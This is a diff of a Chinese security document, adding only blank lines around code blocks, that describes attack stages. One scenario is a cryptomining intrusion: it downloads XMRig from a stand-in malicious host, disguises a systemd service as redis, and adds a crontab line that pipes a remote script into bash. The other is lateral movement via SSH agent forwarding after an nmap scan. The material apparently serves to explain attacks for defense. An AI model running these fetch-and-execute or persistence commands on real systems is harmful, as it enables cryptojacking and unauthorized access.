@@ -26,26 +26,33 @@
 
 **阶段 4：利用（Exploitation）**
 - 成功登录后立即执行：
+
   ```bash
   uname -a
   whoami
   cat /etc/os-release
   ```
+
 - 判断架构（x86_64、aarch64）以选择合适的 binary
 
 **阶段 5：安装（Installation）**
 - 下载并执行 XMRig：
+
   ```bash
   curl -fsSL http://malicious-cdn.com/xmrig.tar.gz | tar xz
   ./xmrig --config config.json
   ```
+
 - 配置 systemd 持久化：
+
   ```bash
   /etc/systemd/system/redis.service  # 伪装成 redis
   systemctl daemon-reload
   systemctl enable redis.service
   ```
+
 - 配置 crontab：
+
   ```bash
   * * * * * curl -fsSL http://cdn.com/check.sh | bash
   ```
@@ -144,18 +151,22 @@
 
 **阶段 2：枚举内网**
 - 在跳板机上扫描内网：
+
   ```bash
   nmap -p 22 10.0.0.0/24
   ```
+
 - 发现数据库服务器、缓存服务器、K8s 节点等
 
 **阶段 3：横向移动**
 - 攻击者发现 SSH Agent Forwarding 被开启
 - 利用 Agent Forwarding 在跳板机上**冒充工程师身份**访问其他机器：
+
   ```bash
   ssh -A db-server  # -A 启用 agent forwarding
   db-server$ ps aux  # 在 db 服务器上执行命令
   ```
+
 - 这种横向不需要 db 服务器的密码或密钥——**Agent Forwarding 让攻击者"借用"原始用户的认证**
 
 **阶段 4：持久化**
